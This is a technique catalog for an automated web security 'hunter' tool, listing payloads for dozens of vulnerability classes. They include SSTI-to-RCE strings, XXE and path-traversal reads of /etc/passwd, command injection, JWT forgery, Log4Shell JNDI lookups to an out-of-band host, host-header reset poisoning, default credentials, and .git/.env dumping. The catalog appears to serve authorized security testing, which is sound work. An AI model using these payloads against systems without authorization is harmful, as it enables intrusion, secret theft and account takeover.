description: Extended hunter technique catalog. Each entry is a per-vulnerability-class drill-down loaded alongside hunter-techniques.json. Authored 2026-05-17 to widen Mantis's coverage beyond the original 8 broad categories. Read-only reference material; execution lives in MCP tools and agents.

entries.title: IDOR — sequential integer IDs
techniques: Enumerate adjacent IDs: GET .../id/N → GET .../id/N±1. Confirmed when attacker reads victim records with attacker-only credentials.
Probe both numeric and stringified IDs (`123` vs `'123'`); Rails/Django sometimes diverge.
Replay under (unauth, attacker, victim) and classify with `mantis_run_auth_differential`.
payload_hints: Burst 50 sequential IDs in one wave; flag any 200 response with a different `organization_id`/`tenant_id`.

entries.title: IDOR — UUID predictability
techniques: Collect 50+ UUIDs of the same object type, then check for time/sequence clustering. UUIDv1 + ULID are time-ordered → enumerable.
Look for ID-in-JWT: decode the access token and probe the `sub` field.
payload_hints: Sort observed IDs by timestamp; predict next-N with timestamp + counter offset.

entries.title: Mass assignment via PATCH/PUT/POST
techniques: PATCH the current user with body fields the form doesn't expose: `role`, `is_admin`, `verified`, `tenant_id`, `permissions`, `email_verified`, `credits`, `subscription_tier`.
If the route normalizes camelCase ↔ snake_case, try both for every privileged field.
Try GraphQL mutation analogues for `updateUser(input: {role: 'admin'})` even when the schema's `input` type omits `role`.

entries.title: SSRF — cloud metadata endpoints
techniques: Test each major cloud's metadata endpoint as the SSRF payload: AWS IMDSv1 169.254.169.254/latest/meta-data/, GCP metadata.google.internal/computeMetadata/v1/, Azure 169.254.169.254/metadata/instance, Alibaba 100.100.100.200/latest/meta-data/.
When IMDSv2 is enforced, try the PUT-then-GET token flow; the SSRF must support state.
Reflect-style: parameter must echo body content. Blind: use OOB DNS canary.

entries.title: SSRF — blind via OOB DNS / HTTP
techniques: Set up an OOB collector (interactsh / burp collaborator). Send the unique subdomain as the SSRF target.
Record any DNS / HTTP / SMTP traffic back to the collector — that's the proof.

entries.title: SSTI — Jinja2 / Flask
techniques: Reflect `{{7*7}}` → 49 confirms. Then probe `{{config}}` → leaks `SECRET_KEY`. Then `{{ ''.__class__.__mro__[1].__subclasses__() }}` for RCE class walk.

entries.title: SSTI — ERB / Ruby
techniques: <%= 7*7 %> → 49 confirms. <%= IO.popen('id').read %> → RCE.

entries.title: NoSQL injection — Mongo $ne / $gt operator bypass
techniques: POST `{"username":{"$ne":null},"password":{"$ne":null}}` to login endpoints. 2xx + session cookie = confirmed.
Probe array operators: `{"username[$gt]":"","password[$gt]":""}` (query-string variant).
Test JS-eval payloads: `{"$where":"sleep(5000)"}` for blind detection.

entries.title: XXE — classic external entity
techniques: POST `<!ENTITY xxe SYSTEM 'file:///etc/passwd'> <foo>&xxe;</foo>`. Confirmed when `root:x:` appears.
Blind variant: external DTD with `<!ENTITY % p SYSTEM 'http://collaborator/dtd'> %p;`.

entries.title: Open redirect — whitelist parser bypass
techniques: Try parser-divergence payloads: `//evil.example`, `https://victim.com@evil.example`, `https://evil.example/?victim.com`, `//\evil.example`, `https:/\evil.example`, `https://evil.example#victim.com`.

entries.title: CRLF — header injection
techniques: Inject `%0d%0aX-Mantis-Crlf:%201` in query; flag confirmed when the injected header is echoed in response.

entries.title: Host header — password reset link poisoning
techniques: Send password-reset request with `Host: evil.attacker.tld` and `X-Forwarded-Host: evil.attacker.tld`. The email's reset link should point to the spoofed host.
OOB-confirm via the attacker's mail inbox.
Companion variant: cache-poison the home page with a spoofed Host so other users get attacker-controlled JS.

entries.title: Path traversal — encoded variants
techniques: Try `../`, URL-encoded `..%2F`, double-encoded `..%252F`, Unicode `%c0%af`, null-byte `%00`. Flag confirmed on `root:x:` or `[fonts]` markers.

entries.title: LDAP injection — auth bypass
techniques: Inject `*)(uid=*` or `*)|(uid=*` into search filters; compare response length to confirm divergence.

entries.title: Command injection — shell metacharacters
techniques: Probe `;id`, `|id`, `` `id` ``, `$(id)`, `&&id`. Flag confirmed when `uid=` + `gid=` appear in the body or response time exceeds baseline (blind time-based).
Blind variant: `;sleep%205`. If wall-clock ≥ 5s, confirmed.

entries.title: File upload — extension bypass
techniques: Test extension confusion: `shell.php.jpg`, `shell.php%00.jpg`, `shell.phtml`, `shell.phP` (Windows case fold).
Test content-type override: `Content-Type: image/png` with PHP body.
Test polyglot files: image with embedded PHP via EXIF comment.

entries.title: Cache poisoning — unkeyed header reflection
techniques: Add unkeyed headers (`X-Forwarded-Host`, `X-Host`, `X-Original-URL`) with attacker payloads; check that the response body reflects the payload AND the cache has retained the poisoned response for the next clean request.

entries.title: HTTP smuggling — CL.TE
techniques: Send a request with both `Content-Length` and `Transfer-Encoding: chunked`. Front-end uses CL, back-end uses TE → the smuggled prefix is parsed as a new request. Time-based confirmation via deliberate delay in the second request.

entries.title: Subdomain takeover — S3 NoSuchBucket
techniques: 404 page contains `NoSuchBucket` → DNS CNAME points at unclaimed S3 bucket. Confirm by attempting to register the bucket name in AWS (the operator does this — do not register unannounced).

entries.title: Subdomain takeover — Heroku app
techniques: Body contains `There is no app configured at that hostname` → attacker may register the Heroku app.

entries.title: DOM XSS — postMessage origin handling
techniques: Grep page JS for `window.addEventListener('message', ...)` handlers that don't check `event.origin`. Try sending a `postMessage` from an attacker-controlled iframe with payloads that hit a sink (`innerHTML`, `location.href`).

entries.title: CORS — reflected origin with credentials
techniques: Send `Origin: https://attacker.example` and check the response for `Access-Control-Allow-Origin: https://attacker.example` AND `Access-Control-Allow-Credentials: true`. That's exfil-grade.

entries.title: JWT — alg:none
techniques: Forge a JWT with `{"alg":"none"}` header and no signature. If the server accepts it, the auth is broken.
Variants: case-fold `None`, `NONE`, `nOnE`.

entries.title: JWT — HS256/RS256 confusion
techniques: Take the server's RS256 public key. Sign a forged JWT using that PEM as the HMAC secret. If accepted, the library treats `alg` as advisory.

entries.title: JWT — kid header traversal
techniques: Set `kid` to `../../../../dev/null` and sign with empty key. Some libraries `os.path.join(key_dir, kid)` and read attacker-controlled paths.
SQL variants when kid is a DB lookup: `' UNION SELECT 'attacker-key'--`.

entries.title: OAuth — missing/predictable state CSRF
techniques: Initiate OAuth flow as attacker, capture the callback URL with code. Stop before redeeming. Send the callback URL to a victim. If the victim's session redeems the code, the attacker's identity is now bound to the victim's account.

entries.title: OAuth — redirect_uri parser bypass
techniques: Probe parser-bypass variants of redirect_uri: path-traversal `/callback/../evil`, double-encoded, fragment `#@evil`, userinfo `https://victim@evil`. If accepted, attacker steals the auth code via their callback handler.

entries.title: GraphQL — introspection enabled
techniques: POST `{__schema{queryType{name}}}`. If returned with the schema map, dump the full schema with the introspection query for mapping mutation surface.

entries.title: GraphQL — alias batching to bypass rate-limit / auth
techniques: Wrap N copies of a mutation in one query body with aliases `m1: mut(...) m2: mut(...) ... m999: mut(...)`. If middleware rate-limits per request rather than per mutation, the limit is bypassed.

entries.title: GraphQL — field suggestion leaks schema
techniques: Send a query with a typo'd field name. Apollo returns a suggestion like `Did you mean 'totalPrice'?` — partial introspection leak.

entries.title: Race condition — TOCTOU on balance / coupon
techniques: Fire N parallel POST requests against an endpoint that does check-then-act on a numeric balance. If the post-condition sum exceeds the pre-condition cap, the race is exploitable.
Use Burp's null-byte-prefix `0x20+0x00` trick to keep requests held until release.

entries.title: Default credentials enumeration
techniques: Try the documented defaults for the detected tech: tomcat manager/manager, jboss admin/admin, kibana elastic/changeme, jenkins admin/admin, default Grafana admin/admin, postgres postgres/postgres.

entries.title: Spring actuator exposure
techniques: Probe /actuator/env, /actuator/heapdump, /actuator/mappings, /actuator/loggers. /env returns env vars (often with secrets). /heapdump is a full memory dump and can be parsed for any in-memory credential.

entries.title: .git/ directory exposure
techniques: GET /.git/config returns the repo's config. If 200, walk /.git/HEAD → refs → objects/<sha>/ to dump the entire repo and extract source + secrets.

entries.title: .env exposure
techniques: GET /.env. If 200 with KEY=value lines, the host is leaking dev creds (DB password, API keys).

entries.title: Source map exposure
techniques: GET <bundle>.js.map. If 200, the response contains the unminified source — useful for finding hidden admin endpoints and secrets baked into the client.

entries.title: WebSocket — origin check missing
techniques: Connect to the WS endpoint from a cross-origin iframe under attacker control. If the server accepts the connection and the session cookie is carried, all bets are off.

entries.title: CSRF on API — missing or weak token
techniques: Drop or modify the CSRF token in a state-changing request. If the action still succeeds, the protection is bypass-able. Test SameSite cookie value too.

entries.title: BFLA — broken function-level auth
techniques: As a low-privileged user, hit `/api/admin/*` and `/api/internal/*` endpoints. Many APIs scope by URL prefix but check role only at the controller, leaving prefix-less variants reachable.

entries.title: Excessive data exposure
techniques: Endpoints that return user objects often include `password_hash`, `password_reset_token`, `email_verified`, `internal_id`, `created_by`, etc. Check the JSON response key list against the documented public schema.

entries.title: Log4Shell / JNDI deserialization
techniques: Inject `${jndi:ldap://oast.live/x}` into headers (User-Agent, X-Api-Version, etc.). If the server's logger evaluates the lookup, the JNDI fetch hits the OAST collector.
Newer payloads bypass naive filters: `${${::-j}ndi:ldap://x}`.

entries.title: Prototype pollution — server-side Node
techniques: POST a body with `__proto__.role=admin` or `constructor.prototype.isAdmin=true`. If merging libraries (lodash.merge, set-value) are used, the attribute flips for every subsequent object.

entries.title: SAML — XML signature wrapping
techniques: Wrap the legitimately signed assertion in an outer Assertion with attacker-supplied NameID; some validators read NameID from the outer element and signature from the inner.

entries.title: SAML — cert / KeyInfo confusion
techniques: Embed attacker-generated KeyInfo in the assertion. Validators that trust the assertion-embedded key over the IdP's pinned cert are exploitable.

entries.title: HTTP verb tampering
techniques: If GET /api/admin/users is 401, try POST, PUT, PATCH, DELETE, OPTIONS, TRACE on the same path. Java EE web.xml constraints sometimes only block specific verbs.
Try `X-HTTP-Method-Override: PUT` on POST endpoints.

entries.title: Content-Type tampering
techniques: Send the same body with different Content-Type headers (`application/json`, `application/x-www-form-urlencoded`, `application/xml`). Many web frameworks have distinct parsers with different authz semantics.

entries.title: Webhook URL whitelist bypass
techniques: Most whitelists check the URL host. Try: `https://allowed.example.com@attacker.example`, `https://attacker.example#allowed.example.com`, IPv6 representation, decimal IP, DNS rebinding.

entries.title: Second-order SQL injection
techniques: Set a profile field (display name, bio) to a payload that escapes the eventual query context (e.g. `';SLEEP(5);--`). Trigger the second-order path (admin dashboard listing all users) and watch for delay.

entries.title: Stored XSS via SVG upload
techniques: Upload an SVG containing `<script>alert(1)</script>` as a user avatar. If the server serves the SVG with `Content-Type: image/svg+xml` and no `X-Content-Type-Options: nosniff`, modern browsers execute it.

entries.title: Open admin panel discovery
techniques: GET /admin without auth. If 200 with admin UI, the panel is exposed. Try paths from the metadata catalog: /admin, /admin.php, /administrator, /manager, /console.
